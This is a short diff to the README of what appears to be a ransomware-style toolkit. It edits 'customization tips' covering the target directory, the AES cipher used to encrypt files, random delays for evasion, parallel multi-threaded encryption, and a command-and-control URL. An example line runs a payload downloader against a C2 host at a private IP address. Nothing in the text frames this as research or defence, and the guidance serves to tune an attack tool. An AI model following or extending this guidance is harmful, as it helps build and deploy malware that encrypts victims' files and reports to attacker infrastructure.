@@ -110,11 +110,11 @@ pkill -f c2_server.py
 
 ## Customization tips
 
-- **Target directory:** edit the `TARGET_DIR` variable in the shell scripts.
+- **Environment configuration:** update `.env` (or provide `ENV_FILE_PATH=/path/to/file`) to set `C2_URL`, `TARGET_DIR`, and the encrypted file suffix without editing scripts.
 - **Cipher suite:** change the `openssl enc -aes-256-*` invocation.
 - **Evasion delays:** insert `sleep $((RANDOM % 10))` or similar pauses.
 - **Parallelization:** leverage `xargs -P 8 -I {} …` for multi-threaded encryption.
-- **C2 endpoint:** update the `C2_URL` variable to your desired host.
+- **C2 endpoint overrides:** export `C2_URL` inline (e.g., `C2_URL=http://192.168.1.5:8080 ./payload_downloader.sh`) for ephemeral tests.
 
 ---
 
